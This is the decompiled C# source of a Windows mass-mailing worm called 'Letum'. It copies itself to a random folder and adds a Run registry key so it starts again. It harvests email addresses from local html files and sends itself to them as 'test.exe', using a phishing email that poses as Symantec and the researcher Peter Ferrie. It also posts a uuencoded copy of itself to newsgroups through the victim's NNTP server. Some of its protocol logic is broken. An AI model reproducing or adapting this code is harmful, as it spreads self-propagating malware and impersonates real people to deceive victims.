using System;
using System.Collections;
using System.IO;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Letum22;

public class Letum
{
	private static Module self;

	private static string pferrie = "peter_ferrie@symantec.com";

	private static string[] nSubject = new string[7] { "Warning!", "Virus Alert", "Customer Support", "Re:", "Re:Warning", "Letum", "Virus Report" };

	private static string[] nData = new string[3] { "Dear Users\r\n\r\nDue to the high increase of the Letum worm, we have upgraded it to Category B. Please use our attached removal tool to scan and disinfect your computer from the malware.\r\n\r\n Regards\r\n Security Response", "Hiya,\r\n\r\n I've found this tool a couple of weeks ago, and after using it i was surprised on how good it was on squashing viruses. I wonder if avers know about this? ;)", ">>\r\n Maybe not but try this, i'm sure it will help you in your fight against malware. The engine it uses isnt to bad, but the searching speed is very fast for such a small size " };

	private static ArrayList List = new ArrayList();

	[STAThread]
	private static void Main()
	{
		//IL_01b7: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		Thread thread = new Thread(nntp);
		Thread thread2 = new Thread(smtp);
		self = Assembly.GetExecutingAssembly().GetModules()[0];
		CollectDirs("C:\\", List);
		int index = random.Next(0, List.Count);
		string text = List[index]!.ToString();
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Retro", writable: true);
		if (registryKey == null)
		{
			registryKey = Registry.CurrentUser.CreateSubKey("Software\\Retro");
			registryKey.SetValue("Letum", text + "\\" + self.ScopeName);
			File.Copy(self.FullyQualifiedName, text.ToString() + "\\" + self.ScopeName);
		}
		object value = registryKey.GetValue("Letum");
		File.Delete(value.ToString());
		File.Copy(self.FullyQualifiedName, text.ToString() + "\\" + self.ScopeName);
		registryKey.SetValue("Letum", text + "\\" + self.ScopeName);
		registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("Letum", text + "\\" + self.ScopeName);
		registryKey.Close();
		thread.Start();
		thread2.Start();
		index = random.Next(0, 1983);
		if (index == random.Next(0, 1983))
		{
			MessageBox.Show("Dear Peter Ferrie \n\nGeNeTiX is a person not a f**king genetically modified food product. \nShe's not happy you called her that! \n\nRegards", "Name Entry Error", (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
	}

	private static void nntp()
	{
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		TcpClient tcpClient = new TcpClient();
		ArrayList arrayList = new ArrayList();
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		int i = 0;
		object obj = null;
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Account Manager\\Accounts");
		string[] subKeyNames = registryKey.GetSubKeyNames();
		string[] array = subKeyNames;
		foreach (string text in array)
		{
			registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Account Manager\\Accounts\\" + text);
			string[] valueNames = registryKey.GetValueNames();
			string[] array2 = valueNames;
			foreach (string text2 in array2)
			{
				if (text2 == "NNTP Server")
				{
					obj = registryKey.GetValue("NNTP Server");
				}
			}
		}
		if (obj == null)
		{
			obj = "news.microsoft.com";
		}
		try
		{
			tcpClient.Connect("news.microsoft.com", 119);
		}
		catch
		{
			return;
		}
		NetworkStream stream = tcpClient.GetStream();
		StreamReader streamReader = new StreamReader(stream);
		StreamWriter streamWriter = new StreamWriter(stream);
		streamWriter.AutoFlush = true;
		string text3 = streamReader.ReadLine();
		if (text3.Substring(0, 3) != "200")
		{
			streamWriter.WriteLine("LIST");
			string text4 = streamReader.ReadLine();
			MessageBox.Show(text4);
			while (text4 != ".")
			{
				text4 = streamReader.ReadLine();
				if (text4 != ".")
				{
					text4 = text4.Substring(0, text4.IndexOf(" "));
					arrayList.Add(text4);
				}
			}
			int index = random.Next(0, arrayList.Count);
			object obj3 = arrayList[index];
			streamWriter.WriteLine("GROUP " + obj3);
			text3 = streamReader.ToString();
			if (text3.Substring(0, 3) != "211")
			{
				streamWriter.WriteLine("POST");
				text3 = streamReader.ToString();
				if (text3.Substring(0, 3) != "340")
				{
					string text5 = nSubject[random.Next(0, nSubject.Length)];
					_ = nData[random.Next(0, nData.Length)] + "\r\n\r\n";
					FileStream fileStream = new FileStream(self.ScopeName, FileMode.Open, FileAccess.Read);
					byte[] array3 = new byte[fileStream.Length];
					fileStream.Read(array3, 0, (int)fileStream.Length);
					fileStream.Close();
					string @string = Encoding.ASCII.GetString(array3);
					string text6 = @string;
					string text7 = string.Empty;
					if (text6.Length % 3 != 0)
					{
						string text8 = new string(' ', 3 - text6.Length % 3);
						text6 += text8;
					}
					int length = text6.Length;
					for (int l = 1; l <= length; l += 3)
					{
						text7 += Convert.ToString((char)((int)Convert.ToChar(text6.Substring(l - 1, 1)) / 4 + 32));
						text7 += Convert.ToString((char)((int)Convert.ToChar(text6.Substring(l - 1, 1)) % 4 * 16 + (int)Convert.ToChar(text6.Substring(l, 1)) / 16 + 32));
						text7 += Convert.ToString((char)((int)Convert.ToChar(text6.Substring(l, 1)) % 16 * 4 + (int)Convert.ToChar(text6.Substring(l + 1, 1)) / 64 + 32));
						text7 += Convert.ToString((char)((int)Convert.ToChar(text6.Substring(l + 1, 1)) % 64 + 32));
					}
					int num;
					for (string text9 = text7.Replace(' ', '`'); i < text9.Length; i += num)
					{
						num = Math.Min(60, text9.Length - i);
						stringBuilder.Append("M");
						stringBuilder.Append(text9, i, num);
						stringBuilder.Append("\r\n");
					}
					string text10 = stringBuilder.ToString();
					text10 = text10.Remove(text10.LastIndexOf("M"), 1);
					string value = string.Concat("FROM: ", pferrie, "\r\nNEWSGROUPS: ", obj3, "\r\nSUBJECT: ", text5, "\r\n\r\n", nData, "begin 644 ", self.ScopeName, "\r\n", text10, "\r\n'\r\nend\r\n.");
					streamWriter.WriteLine(value);
					text3 = streamReader.ReadLine();
					if (text3.Substring(0, 3) != "240")
					{
						tcpClient.Close();
					}
				}
			}
		}
		tcpClient.Close();
	}

	private static void smtp()
	{
		TcpClient tcpClient = new TcpClient();
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		object obj = null;
		int i = 0;
		string text = "----=_NextPart_81_27_24";
		string text2 = "<html><head></head><body bgcolor=\"white\" text=\"black\" link=\"blue\" vlink=\"purple\" alink=\"red\"><table border=\"0\" width=\"780\" bgcolor=\"white\"><tr><td width=\"154\" valign=\"top\" bgcolor=\"white\"><p>&nbsp; <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td width=\"154\"><p>&nbsp;<a href=\"http://www.symantec.com\"><img src=\"http://www.langtech.com/images/projects/symantec_logoESP.gif\" border=\"0\"></a></p><p>&nbsp;</td></tr><tr><td width=\"154\" background=\"http://security.symantec.com/sscv6/languageContent/ie/sym/images/us.navbar.background.gif\"><p>&nbsp;</p><p><font face=\"Verdana\" size=\"1\"><a href=\"http://www.symantec.com/legal/legal_note.html\">Legal Notices</a></font><font face=\"Verdana\" size=\"1\"> <br clear=\"all\"></font><font face=\"Verdana\" size=\"1\"><a href=\"http://www.symantec.com/legal/privacy.html\">Privacy Policy</a></font></p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</td></tr></table><p>&nbsp;</td><td width=\"618\" valign=\"top\" bgcolor=\"white\"><p align=\"left\"><font face=\"Verdana\" size=\"2\"><br></font></p><p align=\"left\">&nbsp;</p><p align=\"left\">&nbsp; <div align=\"center\"><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"80%\"><tr><td width=\"616\"><p align=\"left\">&nbsp;</p><p align=\"left\"><font face=\"Verdana\" size=\"2\">Dear User,</font></p><p align=\"left\"><font face=\"Verdana\" size=\"2\">Due to the high increase of the Letum worm, we have upgraded it to Category B. Please use our attached removal tool to scan and disinfect your computer from the malware.</font></p><p align=\"left\"><font face=\"Verdana\" size=\"2\">If you have any comments or questions about this, then please contact us.</font></p><p align=\"left\"><font face=\"Verdana\" size=\"2\">Regards</font></p><p align=\"left\"><font face=\"Verdana\" size=\"2\">Peter Ferrie<br clear=\"all\"></font><font face=\"Verdana\" size=\"1\">Senior Anti-Virus Researcher / Senior Principal Software Engineer&nbsp;</font></td></tr></table></div><p align=\"left\"></p><p align=\"left\"><div align=\"center\"><table border=\"0\" cellspacing=\"1\" width=\"100%\"><tr><td width=\"100%\" bgcolor=\"white\"><p align=\"center\"><font face=\"Verdana\" size=\"1\"><B>©1995 - 2006 Symantec Corporation All rights reserved.</font></td></B></tr></table></div></td></tr></table><p></p></body></html>";
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Account Manager");
		string[] subKeyNames = registryKey.GetSubKeyNames();
		string[] array = subKeyNames;
		foreach (string text3 in array)
		{
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Account Manager\\" + text3, writable: true);
			object value = registryKey2.GetValue("SMTP Server");
			obj = ((value != null) ? registryKey2.GetValue("SMTP Server") : "mail.primaryhost.org.uk");
		}
		registryKey = Registry.CurrentUser.OpenSubKey("Software\\Retro", writable: true);
		object value2 = registryKey.GetValue("Letum");
		FileStream fileStream = new FileStream(value2.ToString(), FileMode.Open, FileAccess.Read);
		byte[] array2 = new byte[fileStream.Length];
		fileStream.Read(array2, 0, (int)fileStream.Length);
		fileStream.Close();
		int num;
		for (string text4 = Convert.ToBase64String(array2); i < text4.Length; i += num)
		{
			num = Math.Min(76, text4.Length - i);
			stringBuilder.Append(text4, i, num);
			stringBuilder.Append("\r\n");
		}
		tcpClient.Connect((string)obj, 25);
		NetworkStream stream = tcpClient.GetStream();
		StreamReader streamReader = new StreamReader(tcpClient.GetStream());
		StreamWriter streamWriter = new StreamWriter(stream);
		streamWriter.AutoFlush = true;
		string text5 = streamReader.ToString();
		if (text5.Substring(0, 3) != "220")
		{
			streamWriter.WriteLine("HELO localhost\r\n");
			text5 = streamReader.ToString();
			if (text5.Substring(0, 3) != "250")
			{
				try
				{
					foreach (string item in List)
					{
						string[] files = Directory.GetFiles(item, "*html");
						string[] array3 = files;
						foreach (string path2 in array3)
						{
							Regex regex = new Regex("[a-zA-Z0-9-_.-]+@[a-zA-Z0-9-_.-]+\\.[a-zA-Z0-9]+");
							FileStream fileStream2 = new FileStream(path2, FileMode.Open, FileAccess.Read);
							byte[] array4 = new byte[fileStream2.Length];
							fileStream2.Read(array4, 0, (int)fileStream2.Length);
							fileStream2.Close();
							foreach (Match item2 in regex.Matches(Encoding.ASCII.GetString(array4)))
							{
								streamWriter.WriteLine("MAIL FROM: " + pferrie);
								text5 = streamReader.ToString();
								if (!(text5.Substring(0, 3) != "250"))
								{
									continue;
								}
								streamWriter.WriteLine("RCPT TO: " + item2);
								text5 = streamReader.ToString();
								if (!(text5.Substring(0, 3) != "250"))
								{
									continue;
								}
								streamWriter.WriteLine("DATA");
								text5 = streamReader.ToString();
								if (text5.Substring(0, 3) != "354")
								{
									string.Concat("FROM: Symantec Security Response <", pferrie, ">\r\nTO: <", item2, "> ", item2, "SUBJECT: ", nSubject[random.Next(0, nSubject.Length)], "\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed;\r\n\tboundary=\"", text, "\"X-Priority: 3\r\nX-MSMail-Priority: Normal\r\nX-Mailer: Microsoft Outlook Express 6.00.2900.2180\r\nX-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.2180\r\n\r\nThis is a multi-part message in MIME format.\r\n--", text, "\r\nContent-Type: text/html;\r\n\tcharset\"iso-8859-1\"\r\nContent-Transfer-Encoding: 7bit\r\n\r\n", text2, "\r\n--", text, "\r\nContent-Type: application/octet-stream;\r\n\tname=\"test.exe\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment;\r\n\tfilename=\"test.exe\"\r\n\r\n", stringBuilder, "\r\n\r\n--", text, "--\r\n.\r\n");
									text5 = streamReader.ToString();
									if (!(text5.Substring(0, 3) != "250"))
									{
										tcpClient.Close();
										smtp();
									}
								}
							}
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
		}
		tcpClient.Close();
	}

	private static void CollectDirs(string dir, ArrayList storage)
	{
		try
		{
			string[] directories = Directory.GetDirectories(dir);
			string[] array = directories;
			foreach (string text in array)
			{
				storage.Add(text);
				CollectDirs(text, storage);
			}
		}
		catch (UnauthorizedAccessException)
		{
		}
	}
}
